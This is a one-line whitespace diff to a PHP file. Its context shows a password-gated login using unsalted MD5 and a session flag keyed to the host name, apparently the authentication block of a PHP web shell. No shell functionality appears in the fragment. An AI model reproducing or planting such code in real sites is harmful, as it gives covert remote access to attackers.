@@ -42,7 +42,6 @@ function printLogin()
     exit;
 }
 
-
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
